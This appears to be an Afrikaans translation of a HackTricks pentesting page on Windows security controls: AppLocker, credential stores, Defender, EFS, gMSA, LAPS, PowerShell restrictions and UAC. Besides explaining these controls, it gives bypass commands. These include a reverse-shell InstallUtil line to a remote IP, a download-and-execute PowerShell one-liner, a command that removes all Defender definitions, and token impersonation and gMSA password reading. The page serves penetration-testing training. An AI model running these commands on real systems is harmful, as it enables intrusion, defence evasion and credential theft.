# Windows-sekuriteitskontroles

{{#include ../banners/hacktricks-training.md}}

## AppLocker-beleid

'n Toepassing-witlys is 'n lys van goedgekeurde sagtewaretoepassings of uitvoerbare lêers wat op 'n stelsel teenwoordig mag wees en uitgevoer mag word. Die doel is om die omgewing te beskerm teen skadelike malware en nie-goedgekeurde sagteware wat nie by die spesifieke besigheidsbehoeftes van 'n organisasie pas nie.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft se **toepassing-witlystoplossing** en gee stelseladministrateurs beheer oor **watter toepassings en lêers gebruikers kan uitvoer**. Dit bied **fynkorrelige beheer** oor uitvoerbare lêers, scripts, Windows-installeerderlêers, DLL's, verpakte toepassings en verpakte toepassing-installeerders.\
Dit is algemeen dat organisasies **cmd.exe en PowerShell.exe blokkeer** en skryftoegang tot sekere gidse beperk, **maar dit kan alles omseil word**.

### Kontroleer

Kontroleer watter lêers/uitbreidings op die swartlys/witlys is:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Hierdie registerpad bevat die konfigurasies en beleide wat deur AppLocker toegepas word, en bied ’n manier om die huidige stel reëls wat op die stelsel afgedwing word, te hersien:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Nuttige **mappen met skryftoegang** om AppLocker Policy te bypass: Indien AppLocker toelaat dat enigiets binne `C:\Windows\System32` of `C:\Windows` uitgevoer word, is daar **mappen met skryftoegang** wat jy kan gebruik om dit te **bypass**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Algemeen **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries kan ook nuttig wees om AppLocker te omseil.
- **Swak geskryfde reëls kan ook omseil word**
- Byvoorbeeld, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: jy kan enige plek ’n **gids genaamd `allowed`** skep, en dit sal toegelaat word.
- Organisasies fokus ook dikwels daarop om die **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable** te **blokkeer**, maar vergeet van die **ander** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), soos `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` of `PowerShell_ISE.exe`.
- **DLL enforcement** word baie selde geaktiveer weens die bykomende las wat dit op ’n stelsel kan plaas, asook die hoeveelheid toetsing wat nodig is om te verseker dat niks breek nie. Die gebruik van **DLLs as backdoors sal dus help om AppLocker te omseil**.
- Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-code in enige process **uit te voer** en AppLocker te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Berging van Credentials

### Security Accounts Manager (SAM)

Plaaslike credentials is in hierdie file teenwoordig; die passwords is gehash.

### Local Security Authority (LSA) - LSASS

Die **credentials** (gehash) word in die **memory** van hierdie subsystem **gestoor** vir Single Sign-On-doeleindes.\
**LSA** administreer die plaaslike **security policy** (password policy, users se permissions...), **authentication**, **access tokens**...\
LSA sal die een wees wat sal **check** vir verskafde credentials binne die **SAM** file (vir ’n plaaslike login) en met die **domain controller** sal **communicate** om ’n domain user te authenticate.

Die **credentials** word binne die **LSASS-process** **gestoor**: Kerberos tickets, NT- en LM-hashes, maklik gedekripteerde passwords.

### LSA secrets

LSA kan sommige credentials op disk stoor:

- Password van die computer account van die Active Directory (onbereikbare domain controller).
- Passwords van die accounts van Windows services
- Passwords vir scheduled tasks
- Meer (password van IIS applications...)

### NTDS.dit

Dit is die database van die Active Directory. Dit is slegs teenwoordig in Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) is ’n Antivirus wat in Windows 10 en Windows 11, asook in weergawes van Windows Server, beskikbaar is. Dit **blokkeer** algemene pentesting tools soos **`WinPEAS`**. Daar is egter maniere om hierdie **protections te omseil**.

### Check

Om die **status** van **Defender** te check, kan jy die PS cmdlet **`Get-MpComputerStatus`** uitvoer (check die waarde van **`RealTimeProtectionEnabled`** om te weet of dit aktief is):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Om dit te enumerate, kan jy ook die volgende uitvoer:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Geënkripteerde lêerstelsel (EFS)

EFS beveilig lêers deur enkripsie te gebruik, met behulp van 'n **simmetriese sleutel** bekend as die **File Encryption Key (FEK)**. Hierdie sleutel word met die gebruiker se **publieke sleutel** geënkripteer en binne die geënkripteerde lêer se $EFS **alternatiewe datastroom** gestoor. Wanneer dekripsie nodig is, word die ooreenstemmende **private sleutel** van die gebruiker se digitale sertifikaat gebruik om die FEK uit die $EFS-stroom te dekripteer. Meer besonderhede kan [hier](https://en.wikipedia.org/wiki/Encrypting_File_System) gevind word.

**Dekripsie-scenario's sonder gebruiker-inisiasie** sluit die volgende in:

- Wanneer lêers of vouers na 'n nie-EFS-lêerstelsel, soos [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), geskuif word, word hulle outomaties gedekripteer.
- Geënkripteerde lêers wat oor die netwerk via die SMB/CIFS-protokol gestuur word, word voor transmissie gedekripteer.

Hierdie enkripsiemetode bied **deursigtige toegang** tot geënkripteerde lêers vir die eienaar. Om egter bloot die eienaar se wagwoord te verander en aan te meld, sal nie dekripsie moontlik maak nie.

**Belangrike punte**:

- EFS gebruik 'n simmetriese FEK wat met die gebruiker se publieke sleutel geënkripteer is.
- Dekripsie gebruik die gebruiker se private sleutel om toegang tot die FEK te verkry.
- Outomatiese dekripsie vind onder spesifieke toestande plaas, soos wanneer na FAT32 gekopieer word of tydens netwerktransmissie.
- Geënkripteerde lêers is sonder bykomende stappe vir die eienaar toeganklik.

### Kontroleer EFS-inligting

Kontroleer of 'n **gebruiker** hierdie **diens** **gebruik** het deur te kontroleer of hierdie pad bestaan:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Kontroleer **wie** **toegang** tot die lêer het met cipher /c \<file>\
Jy kan ook `cipher /e` en `cipher /d` binne 'n vouer gebruik om al die lêers te **enkripteer** en te **dekripteer**

### Dekripteer EFS-lêers

#### As Authority System

Hierdie metode vereis dat die **slagoffer-gebruiker** 'n **proses** binne die gasheer **laat loop**. Indien dit die geval is, kan jy 'n `meterpreter`-sessie gebruik om die token van die gebruiker se proses te imiteer (`impersonate_token` van `incognito`). Of jy kan eenvoudig na die gebruiker se proses `migrate`.

#### As jy die gebruiker se wagwoord ken

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft het **Group Managed Service Accounts (gMSA)** ontwikkel om die bestuur van diensrekeninge in IT-infrastrukture te vereenvoudig. Anders as tradisionele diensrekeninge wat dikwels die "**Password never expire**"-instelling geaktiveer het, bied gMSA's 'n veiliger en meer hanteerbare oplossing:

- **Outomatiese wagwoordbestuur**: gMSA's gebruik 'n komplekse wagwoord van 240 karakters wat outomaties volgens domein- of rekenaarbeleid verander. Hierdie proses word deur Microsoft se Key Distribution Service (KDC) hanteer, wat die behoefte aan handmatige wagwoordopdaterings uitskakel.
- **Verbeterde sekuriteit**: Hierdie rekeninge is immuun teen uitsluitings en kan nie vir interaktiewe aanmeldings gebruik word nie, wat hul sekuriteit verbeter.
- **Ondersteuning vir veelvuldige gashere**: gMSA's kan oor verskeie gashere gedeel word, wat hulle ideaal maak vir dienste wat op verskeie bedieners loop.
- **Vermoë om geskeduleerde take uit te voer**: Anders as bestuurde diensrekeninge, ondersteun gMSA's die uitvoer van geskeduleerde take.
- **Vereenvoudigde SPN-bestuur**: Die stelsel werk die Service Principal Name (SPN) outomaties op wanneer daar veranderinge aan die rekenaar se sAMaccount-besonderhede of DNS-naam is, wat SPN-bestuur vereenvoudig.

Die wagwoorde vir gMSA's word in die LDAP-eienskap _**msDS-ManagedPassword**_ gestoor en word elke 30 dae outomaties deur Domain Controllers (DCs) teruggestel. Hierdie wagwoord, 'n geënkripteerde datablob bekend as [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kan slegs deur gemagtigde administrateurs en die bedieners waarop die gMSA's geïnstalleer is, verkry word, wat 'n veilige omgewing verseker. Om toegang tot hierdie inligting te verkry, word 'n beveiligde verbinding soos LDAPS vereis, of die verbinding moet met 'Sealing & Secure' geverifieer wees.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Jy kan hierdie wagwoord met [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** lees.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Vind meer inligting in hierdie plasing**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Kyk ook na hierdie [webblad](https://cube0x0.github.io/Relaying-for-gMSA/) oor hoe om ’n **NTLM relay attack** uit te voer om die **wagwoord** van **gMSA** te **lees**.<sup>[[3]](#references)</sup>

## LAPS

Die **Local Administrator Password Solution (LAPS)**, wat by [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) afgelaai kan word, maak die bestuur van plaaslike Administrator-wagwoorde moontlik. Hierdie wagwoorde, wat **gerandomiseer**, uniek en **gereeld verander** word, word sentraal in Active Directory gestoor. Toegang tot hierdie wagwoorde word deur ACLs tot gemagtigde gebruikers beperk. Met voldoende toestemmings word die vermoë verskaf om plaaslike admin-wagwoorde te lees.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sluit baie van die funksies af** wat nodig is om PowerShell doeltreffend te gebruik, soos die blokkering van COM-objects, die toelating van slegs goedgekeurde .NET types, XAML-gebaseerde workflows, PowerShell classes, en meer.

### **Kontroleer**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In huidige Windows sal daardie Bypass nie werk nie, maar jy kan [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) gebruik.\
**Om dit te compileer, mag jy nodig hê om** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` en **die projek na .Net4.5 te verander**.

#### Direkte bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Jy kan [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) of [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) gebruik om **Powershell**-kode in enige proses uit te voer en die beperkte modus te omseil. Vir meer inligting, kyk na: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

By verstek is dit op **restricted** gestel. Belangrikste maniere om hierdie beleid te omseil:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Meer kan [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup> gevind word

## Security Support Provider Interface (SSPI)

Dit is die API wat gebruik kan word om gebruikers te authenticate.

Die SSPI sal daarvoor verantwoordelik wees om die geskikte protokol te vind vir twee masjiene wat wil kommunikeer. Die voorkeurmetode hiervoor is Kerberos. Vervolgens sal die SSPI onderhandel oor watter authentication-protokol gebruik sal word. Hierdie authentication-protokolle word Security Support Provider (SSP) genoem, is binne elke Windows-masjien in die vorm van 'n DLL geleë, en albei masjiene moet dieselfde een ondersteun om te kan kommunikeer.

### Main SSPs

- **Kerberos**: Die voorkeur een
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** en **NTLMv2**: Om versoenbaarheidsredes
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers en LDAP, wagwoord in die vorm van 'n MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL en TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Dit word gebruik om oor die protokol te onderhandel wat gebruik moet word (Kerberos of NTLM, met Kerberos as die verstek een)
- %windir%\Windows\System32\lsasrv.dll

#### Die onderhandeling kan verskeie metodes of slegs een aanbied.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingsaanvraag vir verhoogde aktiwiteite** moontlik maak.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Bypassing Applocker and Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
